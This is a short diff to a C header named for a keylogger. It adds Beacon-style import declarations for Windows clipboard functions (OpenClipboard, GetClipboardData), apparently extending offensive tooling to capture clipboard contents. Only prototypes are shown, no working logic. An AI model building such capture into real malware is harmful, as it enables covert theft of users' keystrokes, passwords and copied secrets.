@@ -120,4 +120,12 @@ DECLSPEC_IMPORT VOID NTDLL$RtlFreeHeap(
     PVOID BaseAddress
 );
 
+DECLSPEC_IMPORT HANDLE USER32$GetClipboardData(
+  UINT uFormat
+);
+
+DECLSPEC_IMPORT BOOL USER32$OpenClipboard(
+    HWND hWndNewOwner
+);
+
 #endif //KEYLOGGER_H
